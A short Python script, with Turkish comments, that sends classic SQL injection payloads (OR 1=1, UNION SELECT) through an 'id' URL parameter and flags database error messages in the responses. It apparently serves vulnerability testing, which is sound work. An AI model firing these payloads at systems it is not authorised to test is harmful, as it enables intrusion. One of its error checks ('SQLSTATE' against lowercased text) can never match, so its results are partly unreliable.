import requests

payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null, null, null --"]

def test_sql_injection(url):
    vulnerabilities = []
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"  # SQL Injection için parametre ekleme
        try:
            response = requests.get(test_url, timeout=5)
            error_messages = ["sql syntax", "mysql_fetch", "native client", "SQLSTATE"]
            for error in error_messages:
                if error in response.text.lower():
                    vulnerabilities.append(f"⚠️ SQL Injection açığı tespit edildi: {test_url}")
                    break
        except:
            pass
    
    return vulnerabilities
